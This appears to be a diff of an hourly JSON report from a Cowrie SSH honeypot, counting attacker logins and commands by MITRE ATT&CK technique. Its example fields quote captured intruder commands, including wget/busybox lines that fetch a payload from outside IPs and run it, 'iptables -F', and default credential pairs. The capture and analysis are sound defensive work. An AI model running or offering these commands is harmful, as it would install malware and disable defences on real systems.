@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-17 17:00:53",
+  "generated": "2026-08-17 18:04:12",
   "totals": {
-    "commands": 3563,
-    "login_failed": 8698,
-    "login_success": 897,
-    "sessions": 6617
+    "commands": 3714,
+    "login_failed": 8887,
+    "login_success": 904,
+    "sessions": 6765
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 8698,
+      "count": 8887,
       "examples": [
         "user / user",
         "root / juantech",
@@ -21,14 +21,14 @@
         "root / 54321"
       ],
       "first": "2026-08-17T00:00:02.095344Z",
-      "last": "2026-08-17T17:00:49.318464Z",
-      "unique_ips": 99
+      "last": "2026-08-17T18:02:36.639669Z",
+      "unique_ips": 105
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 897,
+      "count": 904,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "admin / 7ujMko0admin",
@@ -37,14 +37,14 @@
         "hikvision / hikvision"
       ],
       "first": "2026-08-17T00:00:02.486601Z",
-      "last": "2026-08-17T16:59:15.824230Z",
-      "unique_ips": 77
+      "last": "2026-08-17T17:45:37.091695Z",
+      "unique_ips": 82
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 174,
+      "count": 202,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -53,14 +53,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-08-17T00:12:41.686965Z",
-      "last": "2026-08-17T16:32:38.968588Z",
-      "unique_ips": 19
+      "last": "2026-08-17T17:17:32.751020Z",
+      "unique_ips": 22
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 62,
+      "count": 92,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -69,8 +69,8 @@
         "/bin/busybox wget http://45.150.195.235/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 45.150.195.235 -g -r tftp.sh "
       ],
       "first": "2026-08-17T00:12:43.326791Z",
-      "last": "2026-08-17T14:36:46.709524Z",
-      "unique_ips": 16
+      "last": "2026-08-17T17:46:03.070191Z",
+      "unique_ips": 20
     },
     {
       "id": "T1082",
@@ -92,14 +92,14 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 12,
+      "count": 13,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-17T00:12:43.326791Z",
-      "last": "2026-08-17T16:32:38.968588Z",
-      "unique_ips": 12
+      "last": "2026-08-17T17:07:09.960441Z",
+      "unique_ips": 13
     },
     {
       "id": "T1059.004",
@@ -176,40 +176,52 @@
       "first": "2026-08-17T06:15:44.673762Z",
       "last": "2026-08-17T06:15:44.673762Z",
       "unique_ips": 1
+    },
+    {
+      "id": "T1562.004",
+      "name": "Impair Defenses: Disable or Modify System Firewall",
+      "tactic": "Defense Evasion",
+      "count": 1,
+      "examples": [
+        "iptables -F"
+      ],
+      "first": "2026-08-17T17:46:00.041944Z",
+      "last": "2026-08-17T17:46:00.041944Z",
+      "unique_ips": 1
     }
   ],
   "unmapped": [
     [
       "sh",
-      831
+      835
     ],
     [
       "system",
-      812
+      815
     ],
     [
       "shell",
-      811
+      814
     ],
     [
       "/bin/busybox",
-      380
+      459
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      54
+      55
     ],
     [
       "enable",
-      45
+      48
     ],
     [
       "linuxshell",
-      37
+      39
     ],
     [
       "shel",
-      20
+      21
     ],
     [
       ">/tmp/.codi && cd /tmp/",
